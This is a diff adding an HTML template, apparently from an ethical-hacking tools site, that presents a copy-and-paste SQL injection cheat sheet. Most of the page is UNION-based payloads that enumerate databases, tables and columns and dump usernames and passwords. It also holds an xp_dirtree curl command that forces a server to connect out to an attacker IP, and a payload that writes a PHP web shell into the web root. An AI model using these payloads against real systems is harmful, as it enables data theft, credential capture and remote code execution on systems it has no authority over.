@@ -1,0 +1,104 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Copy and paste : SQLi code : UNION Based</h1>
+    <h2 class="blue">Find column number</h2>
+    <div class="code-box"><pre><code>' ORDER BY 10; -- - </code></pre></div>
+    <div class="code-box"><pre><code>' UNION SELECT 1,2,3,4,5,6; -- - </code></pre></div>
+    <h2 class="blue">Get Databases</h2>
+    <div class="code-box"><pre><code>' UNION SELECT 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata; -- - </code></pre></div>
+    <h2 class="blue">Enumerate DBname, username, and version</h2>
+    <div class="code-box"><pre><code>' UNION SELECT database(),user(),@@version,,4,5,6; -- - </code></pre></div>
+    <h2 class="blue">Get tables from currently working database</h2>
+    <div class="code-box"><pre><code>' UNION SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=database(); -- - 
+※table_schema requires database name.</code></pre></div>
+    <h2 class="blue">Get the columm names from table</h2>
+    <div class="code-box"><pre><code>' UNION SELECT 1,2,3,4,5,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table_name'; -- - </code></pre></div>
+    <h2 class="blue">Get information from another database</h2>
+    <div class="code-box"><pre><code>' UNION SELECT id,firstname,lastname,username,password,6 FROM users.UserDetails; -- - 
+※database.table_name</code></pre></div>
+
+<h1 class="blue">xp_dirtree</h1>
+<div class="code-box"><pre><code> curl -k 'https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.16.38\test%22;%20--'
+; EXEC master..xp_dirtree "\\10.10.16.38\test"; --</code></pre></div>
+
+
+<h1>SQL useful commands</h1>
+<table>
+    <thead>
+        <tr>
+            <th>Code</th>
+            <th>Explanation</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>user()</code></td>
+            <td>Returns the MySQL account name and client host currently connected (e.g. <code>'bob@localhost'</code>).</td>
+        </tr>
+        <tr>
+            <td><code>current_user()</code></td>
+            <td>Shows the account MySQL used to authenticate the session (useful to detect privilege differences vs <code>user()</code>).</td>
+        </tr>
+        <tr>
+            <td><code>database()</code></td>
+            <td>Returns the name of the currently selected database for the session (or <code>NULL</code> if none).</td>
+        </tr>
+        <tr>
+            <td><code>version()</code></td>
+            <td>Shows the database server version string (useful for fingerprinting DB type/version).</td>
+        </tr>
+        <tr>
+            <td><code>@@version</code></td>
+            <td>Server version variable (alternative to <code>version()</code>), often used in injections or fingerprinting.</td>
+        </tr>
+        <tr>
+            <td><code>load_file('/path/to/file')</code></td>
+            <td>Reads a server-side file (must be readable by DB process and <code>secure_file_priv</code> may restrict it); returns file contents as string or <code>NULL</code>.</td>
+        </tr>
+        <tr>
+            <td><code>information_schema.tables</code></td>
+            <td>System table listing all tables accessible to the server; query to enumerate databases and tables (e.g. <code>SELECT table_name FROM information_schema.tables WHERE table_schema='db'</code>).</td>
+        </tr>
+        <tr>
+            <td><code>information_schema.columns</code></td>
+            <td>System table listing columns for tables; useful to discover column names and types for a given table.</td>
+        </tr>
+        <tr>
+            <td><code>GROUP_CONCAT(cols)</code></td>
+            <td>Concatenates multiple row values into a single string — handy to exfiltrate many values in one query (watch max length limits).</td>
+        </tr>
+        <tr>
+            <td><code>CONCAT(a,b,...)</code></td>
+            <td>Joins values together into one string (useful to build output or combine columns and separators).</td>
+        </tr>
+        <tr>
+            <td><code>UNION SELECT ...</code></td>
+            <td>Combine results of another SELECT with the original query (commonly used in SQLi to return attacker-controlled columns; column count/types must match).</td>
+        </tr>
+        <tr>
+            <td><code>EXPLAIN SELECT ...</code></td>
+            <td>Shows the query execution plan — useful for optimization and to understand how the DB will process a query.</td>
+        </tr>
+        <tr>
+            <td><code>LIMIT offset,count</code></td>
+            <td>Restricts result rows (useful when enumerating large tables or performing incremental extraction).</td>
+        </tr>
+    </tbody>
+</table>
+
+
+
+
+
+    <h1>SQLi codes</h1>
+    <div class="code-box"><pre><code>=-1 UNION SELECT 1,'&lt;?php system($_REQUEST["cmd"]);?&gt;',3,4,5,6,7 <u>into outfile</u> '/var/www/html/test.php</code></pre></div>
+</body>
+</html>
